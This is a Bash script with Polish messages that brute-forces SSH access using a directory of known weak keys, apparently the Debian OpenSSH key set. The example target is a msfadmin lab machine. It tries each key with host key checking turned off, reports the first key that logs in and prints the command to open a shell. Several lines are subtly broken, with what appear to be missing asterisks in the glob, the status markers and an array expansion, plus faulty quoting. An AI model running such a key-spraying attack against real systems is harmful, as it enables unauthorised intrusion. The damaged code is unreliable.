#!/usr/bin/env bash
set -euo pipefail

if [[ $# -ne 3 ]]; then
echo "Użycie: $0 <target_ip_or_host> <user> <keys_dir>"
echo "Przykład: $0 192.168.100.20 msfadmin /path/debian-ssh/debian_ssh_rsa_2048"
exit 1
fi

TARGET="$1"
USER="$2"
KEYDIR="$3"

if [[ ! -d "$KEYDIR" ]]; then
echo "Błąd: katalog z kluczami nie istnieje: $KEYDIR"
exit 2
fi

command -v ssh >/dev/null || { echo "Brak ssh w PATH"; exit 3; }

echo "[] Target: $USER@$TARGET"
echo "[] Katalog kluczy: $KEYDIR"

SSH_OPTS=(-o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=5)

HIT=""
COUNT=0
shopt -s nullglob
for key in "$KEYDIR"/; do
[[ -f "$key" ]] || continue
((COUNT++)) || true
chmod 600 "$key" 2>/dev/null || true
printf "\r[] Sprawdzam klucz %d: %s" "$COUNT" "$(basename "$key")"
if ssh -i "$key" "${SSH_OPTS[@]}" "$USER@$TARGET" true &>/dev/null; then
HIT="$key"
echo
echo "[+] Trafienie: $HIT"
break
fi
done
echo

if [[ -z "$HIT" ]]; then
echo "[-] Brak trafienia w puli: $KEYDIR"
exit 4
fi

echo "[] Aby uruchomić powłokę:"
echo "ssh -i "$HIT" ${SSH_OPTS[]} $USER@$TARGET"